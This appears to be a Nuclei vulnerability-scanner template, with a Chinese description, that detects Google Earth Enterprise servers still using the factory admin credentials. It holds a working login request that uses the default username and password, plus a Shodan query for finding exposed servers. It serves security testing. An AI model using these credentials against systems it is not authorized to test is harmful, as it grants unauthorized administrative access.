id: google-earth-dlogin

info:
  name: Google Earth Enterprise 默认口令登录（弱口令）
  author: orpheus,johnjhacking
  severity: high
  description: |
    该模板通过尝试 Google Earth Enterprise 的默认账号口令，并依据成功登录后的管理界面响应判断目标是否仍在使用出厂凭据。若命中，攻击者可直接访问 Earth Enterprise 管理后台并修改服务配置。
  remediation: |
    可使用以下命令重新设置 Google Earth Enterprise 的用户名和密码：
    
    `sudo /opt/google/gehttpd/bin/htpasswd -c /opt/google/gehttpd/conf.d/.htpasswd geapacheuser`
  reference:
    - https://johnjhacking.com/blog/gee-exploitation/
    - https://www.opengee.org/geedocs/5.2.2/answer/3470759.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    shodan-query: title:"GEE Server"
  tags: default-login,google-earth,vuln

http:
  - raw:
      - |
        GET /admin/ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    attack: pitchfork
    payloads:
      username:
        - geapacheuser
      password:
        - geeadmin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        condition: and
        words:
          - 'DashboardPanel'
          - 'Earth Enterprise Server'
